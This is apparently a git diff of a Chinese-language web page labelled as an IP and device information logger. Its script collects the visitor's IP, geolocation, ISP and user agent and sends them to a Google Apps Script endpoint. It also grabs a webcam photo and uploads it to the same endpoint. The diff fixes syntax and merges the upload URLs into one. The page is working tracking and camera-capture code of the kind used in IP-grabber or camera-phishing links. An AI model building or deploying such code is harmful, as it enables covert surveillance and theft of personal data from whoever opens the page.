@@ -6,7 +6,7 @@
   <title>IP 與設備訊息記錄</title>
 </head>
 <body>
-  <h1>IP 與設備訊息ss記錄</h1>
+  <h1>IP 與設備訊息記錄</h1>
   <p id="ipInfo">IP 資訊載入中...</p>
   <p id="status">尚未開始操作</p>
   <video id="video" autoplay playsinline width="320" height="240"></video>
@@ -15,7 +15,7 @@
 
   <script>
     // 獲取 IP 資訊
- async function getIpInfo() {
+    async function getIpInfo() {
       try {
         const response = await fetch('https://ipinfo.io/json');
         const data = await response.json();
@@ -24,11 +24,11 @@
         const userAgent = navigator.userAgent;
 
         // 顯示 IP 資訊
-        document.getElementById('ipInfo').innerText =
-          IP: ${ip}, 類型: ${ipType}, 城市: ${city}, 區域: ${region}, 國家: ${country}, 組織: ${org}, 用戶代理: ${userAgent};
+        document.getElementById('ipInfo').innerText = 
+          `IP: ${ip}, 類型: ${ipType}, 城市: ${city}, 區域: ${region}, 國家: ${country}, 組織: ${org}, 用戶代理: ${userAgent}`;
 
-        // 發送 GET 請求到 Google Apps Script
-        const url = new URL('https://script.google.com/macros/s/AKfycbyBre7Ovl0v3NZv8fdG2Jio0U7c86QuVhqJh43sHXoQmLHMmmrPi_UQs7c023hYujxFiA/exec');
+        // 發送 IP 資訊到後端
+        const url = new URL('https://script.google.com/macros/s/AKfycbxQheARzEqjFsSFoJ9LgqR9mXayjpDQmpvw85CwGQs3uMwXyFuRixLqEDnUA_LVLTElYg/exec');
         url.searchParams.append('ip', ip);
         url.searchParams.append('ipType', ipType);
         url.searchParams.append('userAgent', userAgent);
@@ -43,16 +43,13 @@
         if (responseData.success) {
           document.getElementById('status').innerText = 'IP 資訊已成功上傳！';
         } else {
-          document.getElementById('status').innerText = '伺服器錯誤，無法上傳。';
+          document.getElementById('status').innerText = '伺服器錯誤，無法上傳 IP 資訊。';
         }
       } catch (error) {
         console.error('錯誤:', error);
-        document.getElementById('status').innerText = '操作失敗，請檢查控制台。';
+        document.getElementById('status').innerText = 'IP 資訊上傳失敗，請檢查控制台。';
       }
     }
-
-
-
 
     // 拍攝照片並上傳到後端
     async function capturePhoto() {
@@ -71,7 +68,7 @@
         const formData = new FormData();
         formData.append('photoDataUrl', dataUrl);
 
-        const response = await fetch('https://script.google.com/macros/s/AKfycbw9RRURCulzU7zAqMIqTDfSVwOQhayIeGefS1PMZTxkV34KEbcOnpVn-MOuWi19_V9_FA/exec', {
+        const response = await fetch('https://script.google.com/macros/s/AKfycbxQheARzEqjFsSFoJ9LgqR9mXayjpDQmpvw85CwGQs3uMwXyFuRixLqEDnUA_LVLTElYg/exec', {
           method: 'POST',
           body: formData,
         });
